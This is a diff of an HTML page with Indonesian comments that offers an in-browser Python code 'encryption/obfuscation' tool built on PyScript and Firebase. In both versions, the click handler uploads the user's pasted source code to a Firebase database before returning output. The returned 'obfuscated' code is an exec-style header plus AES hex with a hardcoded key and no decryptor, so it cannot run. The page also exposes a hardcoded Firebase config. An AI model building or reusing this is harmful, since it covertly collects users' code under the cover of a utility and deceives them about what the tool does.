@@ -8,7 +8,6 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script>
-      // Konfigurasi Firebase (ubah jika diperlukan)
       var firebaseConfig = {
         apiKey: "AIzaSyDIOjpEtWakfh0WNCDC1iPj9Qm5zKDlaL4",
         authDomain: "login-24767.firebaseapp.com",
@@ -34,7 +33,6 @@
     <script defer src="https://pyscript.net/releases/2022.12.1/pyscript.js"></script>
 
     <style>
-      /* Tampilan modern minimal dengan tema gelap */
       body {
         margin: 0;
         padding: 0;
@@ -125,44 +123,49 @@
 
     <!-- PyScript: Kode Python untuk enkripsi dan obfuscation -->
     <py-script>
+import asyncio
 import uuid
 import js
-import micropip
-await micropip.install("pyaes")
-import pyaes
 
-def pad(data: bytes) -> bytes:
-    pad_len = 16 - (len(data) % 16)
-    return data + bytes([pad_len] * pad_len)
+async def main():
+    import micropip
+    await micropip.install("pyaes")
+    import pyaes
 
-key = b"thisisaverysecretkey1234567890ab"
-iv = b"initialvector1234"
+    def pad(data: bytes) -> bytes:
+        pad_len = 16 - (len(data) % 16)
+        return data + bytes([pad_len] * pad_len)
 
-def encrypt_text(plaintext: str) -> str:
-    data = plaintext.encode("utf-8")
-    padded = pad(data)
-    aes = pyaes.AESModeOfOperationCBC(key, iv=iv)
-    encrypted = aes.encrypt(padded)
-    return encrypted.hex()
+    key = b"thisisaverysecretkey1234567890ab"
+    iv = b"initialvector1234"
 
-def obfuscate_code(plaintext: str) -> str:
-    encrypted_hex = encrypt_text(plaintext)
-    header = (
-        "pyobfuscate=(lambda getattr:[((lambda IIlII,IlIIl:setattr(__builtins__,IIlII,IlIIl)) "
-        "for IIlII,IlIIl in getattr.items()]);Il=chr(114)+chr(101);lI=r'[^a-zA-Z0-9]';"
-        "lIl=chr(115)+chr(117)+chr(98);lllllllllllllll,llllllllllllllI,lllllllllllllIl,lllllllllIIllIIlI = __import__,getattr,bytes,exec\n\n"
-        "__import__(\"sys\").setrecursionlimit(100000000);"
-    )
-    return header + encrypted_hex
+    def encrypt_text(plaintext: str) -> str:
+        data = plaintext.encode("utf-8")
+        padded = pad(data)
+        aes = pyaes.AESModeOfOperationCBC(key, iv=iv)
+        encrypted = aes.encrypt(padded)
+        return encrypted.hex()
 
-def on_encrypt(event):
-    code = js.document.getElementById("codeInput").value
-    identifier = str(uuid.uuid4())
-    js.sendToFirebase(identifier, code)
-    obfuscated = obfuscate_code(code)
-    js.document.getElementById("output").innerText = obfuscated
+    def obfuscate_code(plaintext: str) -> str:
+        encrypted_hex = encrypt_text(plaintext)
+        header = (
+            "pyobfuscate=(lambda getattr:[((lambda IIlII,IlIIl:setattr(__builtins__,IIlII,IlIIl)) "
+            "for IIlII,IlIIl in getattr.items()]);Il=chr(114)+chr(101);lI=r'[^a-zA-Z0-9]';"
+            "lIl=chr(115)+chr(117)+chr(98);lllllllllllllll,llllllllllllllI,lllllllllllllIl,lllllllllIIllIIlI = __import__,getattr,bytes,exec\n\n"
+            "__import__(\"sys\").setrecursionlimit(100000000);"
+        )
+        return header + encrypted_hex
 
-js.document.getElementById("encryptButton").addEventListener("click", on_encrypt)
+    def on_encrypt(event):
+        code = js.document.getElementById("codeInput").value
+        identifier = str(uuid.uuid4())
+        js.sendToFirebase(identifier, code)
+        obfuscated = obfuscate_code(code)
+        js.document.getElementById("output").innerText = obfuscated
+
+    js.document.getElementById("encryptButton").addEventListener("click", on_encrypt)
+
+asyncio.ensure_future(main())
     </py-script>
 
     <!-- Script untuk fungsi COPY -->
